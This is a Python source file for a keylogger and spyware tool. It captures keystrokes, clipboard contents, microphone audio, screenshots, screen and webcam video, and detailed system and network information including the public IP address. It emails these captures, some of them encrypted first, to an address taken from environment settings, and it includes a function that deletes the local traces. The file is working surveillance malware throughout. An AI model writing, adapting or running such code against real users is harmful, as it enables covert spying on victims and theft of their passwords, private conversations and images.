from concurrent.futures import ThreadPoolExecutor
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from scipy.io.wavfile import write
from dotenv import load_dotenv
from time import perf_counter
from PIL import ImageGrab
import sounddevice as sd
from requests import get
# import win32clipboard
import numpy as np
import subprocess
import clipboard
import pyautogui
import platform
import psutil
import socket
import uuid
import cv2
import re
import os

from mailer import send_mail_with_attachment
load_dotenv()


# File names to store data
keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
screen_record_vid = "screen_record.mp4"
front_cam_vid = "front_cam.mp4"

# Encrypted file names
system_info_e = 'e_system_info.txt'
clipboard_info_e = 'e_clipboard.txt'
keys_info_e = 'e_keys_log.txt'

base_path = os.getenv("LINUX_BASE_PATH")
email_report = os.getenv("REPORT_MAIL")

# Windows Path
# file_path = os.getenv("WINDOWS_BASE_PATH")
# extend_path = "\\"
# file_merge = file_path+extend_path

def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


# SYSTEM INFORMATION
def system_information():
    file_path = os.path.join(base_path, system_info)

    with open(file_path, "a") as f:
        f.write("SYSTEM INFORMATION:\n")
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)

        try:
            external_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + external_ip + "\n")
        except Exception:
            f.write("Couldn't get public IP address!\n")

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ip_addr + "\n")
        f.write("Network Name: " + platform.node() + "\n")
        f.write("MAC Address: " + ':'.join(re.findall('..', '%012x' % uuid.getnode())) + "\n")
        f.write("RAM: " + str(round(psutil.virtual_memory().total / (1024.0 **3))) + " GB\n")
        f.write("System Release: " + platform.release() + "\n")
        arch = platform.architecture()
        f.write("Architecture: (" + arch[0] + ", " + arch[1] + ")\n")
        f.write("Platform: " + platform.platform() + "\n\n")

        f.write("CPU INFORMATION\n")
        phys_cores = str(psutil.cpu_count(logical=False))
        f.write("Physical Cores: " + phys_cores + "\n")
        tot_cores = str(psutil.cpu_count(logical=True))
        f.write("Total Cores: " + tot_cores + "\n")
        cpufreq = psutil.cpu_freq()
        max_freq = str(cpufreq.max)
        min_freq = str(cpufreq.min)
        curr_freq = str(cpufreq.current)
        f.write("Max Frequency: " + max_freq + " Mhz\n")
        f.write("Min Frequency: " + min_freq + " Mhz\n")
        f.write("Current Frequency: " + curr_freq + " Mhz\n")

        for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
            f.write(f"Core {i}: {percentage}%\n")
        f.write(f"Total CPU Usage: {psutil.cpu_percent()}%\n\n")

        f.write("MEMORY USAGE:\n")
        svmem = psutil.virtual_memory()
        f.write(f"Total: {get_size(svmem.total)}\n")
        f.write(f"Available: {get_size(svmem.available)}\n")
        f.write(f"Used: {get_size(svmem.used)}\n")
        f.write(f"Percentage: {svmem.percent}%\n")
        swap = psutil.swap_memory()
        f.write(f"Total: {get_size(swap.total)}\n")
        f.write(f"Free: {get_size(swap.free)}\n")
        f.write(f"Used: {get_size(swap.used)}\n")
        f.write(f"Percentage: {swap.percent}%\n\n")

        f.write("DISK INFORMATION\n")
        partitions = psutil.disk_partitions()
        for partition in partitions:
            f.write(f"Device: {partition.device}\n")
            f.write(f"Mountpoint: {partition.mountpoint}\n")
            f.write(f"File System Type: {partition.fstype}\n")
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                continue
            f.write(f"Total Size: {get_size(partition_usage.total)}\n")
            f.write(f"Used: {get_size(partition_usage.used)}\n")
            f.write(f"Free: {get_size(partition_usage.free)}\n")
            f.write(f"Percentage: {partition_usage.percent}%\n")

        f.write("IO STATISTICS\n")
        disk_io = psutil.disk_io_counters()
        f.write(f"Total Read: {get_size(disk_io.read_bytes)}\n")
        f.write(f"Total Write: {get_size(disk_io.write_bytes)}\n\n")

        f.write("NETWORK INFORMATION\n")
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                f.write(f"Interface: {interface_name}\n")
                if str(address.family) == 'AddressFamily.AF_INET':
                    f.write(f"IP Address: {address.address}\n")
                    f.write(f"Netmask: {address.netmask}\n")
                    f.write(f"Broadcast IP: {address.broadcast}\n")
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    f.write(f"MAC Address: {address.address}\n")
                    f.write(f"Netmask: {address.netmask}\n")
                    f.write(f"Broadcast MAC: {address.broadcast}\n")

        try:
            encrypt_and_mail(file_path, os.path.join(base_path, system_info_e), system_info, os.path.join(base_path, system_info_e), email_report)
        except:
            print("Error Sending Mail")


# CLIPBOARD INFORMATION
def clipboard_information():
    try:
        file_path = os.path.join(base_path, clipboard_info)
        with open(file_path, "a") as f:
            try:
                clipboard_data = clipboard.paste()
                f.write("Clipboard Data:\n" + clipboard_data)

                # win32clipboard.OpenClipboard(0)
                # clipboard_data = win32clipboard.GetClipboardData()
                # win32clipboard.CloseClipboard()
                # f.write("Clipboard Data: \n" + clipboard_data)
            except:
                print("Clipboard Information Couldn't Be Captured")

            try:
                encrypt_and_mail(file_path, os.path.join(base_path, clipboard_info_e), clipboard_info, os.path.join(base_path, clipboard_info_e), email_report)
            except:
                print("Error Sending Mail")
    except:
        print("Clipboard Information Couldn't Be Captured")


# MICROPHONE INFORMATION
def sound_information():
    fs = 44100 # Sampling frequency
    duration = 5
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    file_path = os.path.join(base_path, audio_info)
    write(file_path, fs, recording)

    try:
        send_mail_with_attachment(audio_info, file_path, email_report)
    except:
        print("Error Sending Mail")


# SCREENSHOT INFORMATION
def screenshot():
    screenshot = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=False, xdisplay=None)
    file_path = os.path.join(base_path, screenshot_info)
    screenshot.save(file_path)

    try:
        send_mail_with_attachment(screenshot_info, file_path, email_report)
    except:
        print("Error Sending Mail")


# GET SCREEN RESOLUTION
def get_screen_resolution():
    output = subprocess.Popen('xrandr | grep "\*" | cut -d" " -f4', shell=True, stdout=subprocess.PIPE).communicate()[0]
    resolution = output.split()[0].split(b'x')
    return {'width': resolution[0].decode(), 'height': resolution[1].decode()}


# FRONT CAMERA VIDEO
def record_frontcam():
    file_path_front_cam = os.path.join(base_path, front_cam_vid)

    resolution = get_screen_resolution()
    width = int(resolution['width'])
    height = int(resolution['height'])
    res = (width, height)

    codec = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
    fps = 60.0

    front_cam = cv2.VideoWriter(file_path_front_cam, codec, fps, res)

    webcam = cv2.VideoCapture(0)
    start = perf_counter()

    while True:
        fc = ImageGrab.grab(bbox=(0, 0, width, height))
        img_np = np.array(fc)
        img_final = cv2.cvtColor(img_np, cv2.COLOR_BGR2RGB)
        _, frame1 = webcam.read()
        fr_height, fr_width, _ = frame1.shape
        img_final[0:fr_height, 0: fr_width, :] = frame1[0:fr_height, 0: fr_width, :]
        front_cam.write(img_final)

        end = perf_counter()
        if int(end-start) == 10:
            break

        try:
            send_mail_with_attachment(front_cam_vid, file_path_front_cam, email_report)
        except:
            print("Error Sending Mail")


# SCREEN RECORDING
def record_screen():
    file_path_screen = os.path.join(base_path, screen_record_vid)

    resolution = get_screen_resolution()
    width = int(resolution['width'])
    height = int(resolution['height'])
    res = (width, height)

    codec = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
    fps = 60.0

    screen = cv2.VideoWriter(file_path_screen, codec, fps, res)

    start = perf_counter()

    while True:
        sc = pyautogui.screenshot()
        frame2 = np.array(sc)
        frame2 = cv2.cvtColor(frame2, cv2.COLOR_BGR2RGB)
        screen.write(frame2)

        end = perf_counter()
        if int(end-start) == 10:
            break

    try:
        send_mail_with_attachment(screen_record_vid, file_path_screen, email_report)
    except:
        print("Error Sending Mail")


# KEY MONITORING & LOGGING
class logKeys:
    def __init__(self):
        self.count = 0
        self.keys = []
        self.file_path = os.path.join(base_path, keys_info)
        self.e_file_path = os.path.join(base_path, keys_info_e)

    # When a key is pressed
    def on_press(self, key):
        # Keep track of key presses and the number of keys pressed
        self.keys.append(key)
        self.count = self.count+1
        print("{0} pressed".format(key))
        # Write to file after every 15 key presses and reset variables
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    # When a key is released
    def on_release(self, key):
        # Condition to exit keylogger
        if key==Key.esc:
            return False

    # Write the key presses to a file
    def write_file(self, keys):
        with open(self.file_path, "a") as f:
            for key in keys:
                # Format key to be readable
                formatted_key = str(key).replace("'", "")
                if formatted_key.find("space") > 0:
                    f.write("\n")
                # If not a special key then write to file otherwise ignore
                elif formatted_key.find("Key") == -1:
                    f.write(formatted_key)

    # Logs keypresses
    def log(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        print("Logging Complete")

        try:
            encrypt_and_mail(self.file_path, self.e_file_path, keys_info, self.e_file_path, email_report)
        except:
            print("Error Sending Mail")

def run_key_logger():
    keyLog = logKeys()
    keyLog.log()

def run_parallel():
    executor = ThreadPoolExecutor(max_workers=8)

    t1 = executor.submit(run_key_logger)
    t2 = executor.submit(system_information)
    t3 = executor.submit(clipboard_information)
    t4 = executor.submit(sound_information)
    t5 = executor.submit(screenshot)
    t6 = executor.submit(record_screen)
    t7 = executor.submit(record_frontcam)

    executor.shutdown(wait=True)


# FILE ENCRYPTION AND SENDING MAIL
def encrypt_and_mail(file_to_encrypt: str, encrypted_file_name: str, filename: str, attachment: str, email: str):
    key = os.getenv("ENCRYPTION_KEY")

    with open(file_to_encrypt, 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_name, 'wb') as f:
        f.write(encrypted)

    send_mail_with_attachment(filename, attachment, email)


# FILE ENCRYPTION
def encrypt_files():
    key_path = os.path.join(base_path, keys_info)
    clip_path = os.path.join(base_path, clipboard_info)
    sys_path = os.path.join(base_path, system_info)

    key_e_path = os.path.join(base_path, keys_info_e)
    clip_e_path = os.path.join(base_path, clipboard_info_e)
    sys_e_path = os.path.join(base_path, system_info_e)

    files_to_encrypt = [key_path, clip_path, sys_path]
    encrypted_file_names = [key_e_path, clip_e_path, sys_e_path]

    cnt = 0
    key = os.getenv("ENCRYPTION_KEY")

    for encrypting_file in files_to_encrypt:
        with open(files_to_encrypt[cnt], 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(encrypted_file_names[cnt], 'wb') as f:
            f.write(encrypted)

        cnt += 1


# FILE DELETING
def delete_files():
    files = [system_info, clipboard_info, keys_info, audio_info, screenshot_info, screen_record_vid]
    encrypted_files = [system_info_e, clipboard_info_e, keys_info_e]

    for file in files:
        try:
            os.remove(os.path.join(base_path, file))
        except Exception:
            print("File %s Not Found" %file)

    for file in encrypted_files:
        try:
            os.remove(os.path.join(base_path, file))
        except Exception:
            print("Encrypted File %s Not Found" %file)


if __name__ == "__main__":
    run_parallel()
    # delete_files()
